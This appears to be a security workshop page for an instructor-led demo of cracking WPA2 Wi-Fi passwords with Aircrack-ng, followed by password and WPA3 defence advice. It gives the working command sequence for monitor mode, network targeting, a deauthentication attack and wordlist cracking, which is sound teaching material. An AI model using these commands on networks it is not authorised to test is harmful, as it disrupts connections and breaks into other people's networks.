# Demo: Wireless Security with Aircrack-ng

**Duration:** ~20 minutes  
**Type:** Instructor-led demo (students observe)

## 🎯 Objective

Understand how WPA2 Wi-Fi passwords can be cracked, and why strong passwords and WPA3 matter.

> ⚠️ **This is a demo, not a hands-on lab.** Cracking Wi-Fi requires a wireless adapter in monitor mode, which isn't available in Docker containers or online workshops. Your instructor will demonstrate this live.

---

## 📖 How Wi-Fi Cracking Works

### The Attack Flow:

```
1. Monitor Mode     →  Put Wi-Fi adapter into passive listening mode
2. Capture Traffic  →  Wait for a device to connect (or force a disconnect)
3. Grab Handshake   →  Capture the WPA2 4-way handshake
4. Crack Offline    →  Test passwords from a wordlist against the handshake
```

### Key concept: The 4-Way Handshake
When a device connects to a WPA2 network, it performs a "handshake" that contains a hash of the password. If we capture this handshake, we can try to crack it **offline** — without any further network access.

---

## 🖥️ Demo Steps (Instructor)

### Step 1: Enable Monitor Mode
```bash
# List wireless interfaces
airmon-ng

# Enable monitor mode on wlan0
airmon-ng start wlan0
```

### Step 2: Scan for Networks
```bash
# Scan all nearby Wi-Fi networks
airodump-ng wlan0mon
```

Output shows:
- **BSSID** — The access point's MAC address
- **CH** — Channel number
- **ESSID** — Network name
- **ENC** — Encryption type (WPA2, WEP, etc.)

### Step 3: Target a Specific Network
```bash
# Focus on one network, capture to a file
airodump-ng -c <channel> --bssid <target_bssid> -w capture wlan0mon
```

### Step 4: Force a Reconnection (Deauth Attack)
```bash
# Send deauthentication packets to force a client to reconnect
aireplay-ng --deauth 10 -a <target_bssid> wlan0mon
```

> When the client reconnects, we capture the 4-way handshake.

### Step 5: Crack the Password
```bash
# Use a wordlist to crack the captured handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

If the password is in the wordlist, Aircrack-ng will find it:
```
KEY FOUND! [ password123 ]
```

---

## 🔑 Key Takeaways

### Why weak Wi-Fi passwords are dangerous:
- A common password like `password123` is cracked in **seconds**
- The full `rockyou.txt` wordlist has **14 million** passwords
- GPU-accelerated tools (Hashcat) can test **millions of passwords per second**

### How to protect yourself:

| Do ✅ | Don't ❌ |
|-------|---------|
| Use WPA3 if available | Use WEP (cracked in minutes) |
| Use 12+ character passwords | Use dictionary words |
| Mix letters, numbers, symbols | Use personal info (birthdays, names) |
| Use a unique Wi-Fi password | Reuse passwords from other accounts |
| Hide your SSID (minor benefit) | Leave default router passwords |

### WPA3 improvements:
- **SAE handshake** — resistant to offline dictionary attacks
- **Forward secrecy** — past traffic can't be decrypted even if password is compromised
- **Protected Management Frames** — prevents deauth attacks

---

## 📂 Practice Files (Optional, Post-Workshop)

For students who want to practice the cracking step offline:

```
aircrack-demo/
├── capture.cap     # Pre-recorded WPA2 handshake
└── wordlist.txt    # Small wordlist that contains the password
```

### Try it yourself (on Kali VM or native Linux with aircrack-ng):
```bash
aircrack-ng aircrack-demo/capture.cap -w aircrack-demo/wordlist.txt
```

> **Note:** You'll need to install `aircrack-ng` on your own machine or use a Kali VM for this. The Docker Kali container in our lab doesn't include it (no Wi-Fi adapter access).

---

## 📚 Further Reading
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/doku.php)
- [WPA3 Security Improvements](https://www.wi-fi.org/discover-wi-fi/security)
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

---

## ➡️ That's the end of Day 1! See you tomorrow for Day 2.
## ➡️ Day 2 starts with: [Lab 3: Vulnerability Assessment](../day2/lab3-vulnerability-assessment.md)
